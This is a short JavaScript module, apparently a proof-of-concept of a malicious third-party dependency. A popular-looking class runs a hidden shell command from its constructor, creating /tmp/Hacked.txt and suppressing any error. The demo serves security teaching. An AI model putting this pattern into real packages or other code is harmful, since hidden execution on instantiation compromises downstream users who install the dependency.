// Define a Class in the dependency, that we suppose is the popular
// one for which this 3rd-party dependency is tipically downloaded
// by downstream users


class MyClass {
    constructor(name) {
      this.name = name;

      const { execSync } = require('child_process');

      try {
        execSync('touch /tmp/Hacked.txt');
        
      } catch (error) {
        // Suppress warning
      }
    }
  
    sayHello() {
      return `Hello from ${this.name}!`;
    }
  }
  
module.exports = MyClass;
  
